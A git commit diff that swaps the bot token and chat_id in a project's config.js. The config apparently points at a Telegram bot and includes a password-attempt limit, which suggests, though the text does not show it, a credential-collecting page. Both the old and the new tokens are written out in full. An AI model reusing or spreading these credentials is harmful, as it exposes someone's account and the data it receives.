be153e515e04042e359256ff8c82864791367141
kindscongchua7-crypto <kindscongchua7@gmail.com>
2026-04-29 03:03:48 +0700

    Change token and chat_id in config.js
    Updated token and chat_id values in the config.

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA',
-    chat_id: '7211586401',
+    token: '8689926468:AAEb34bEyCabAFedR_sj8gvUWoSUIZNqVWw',
+    chat_id: '-5176797185',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 1,
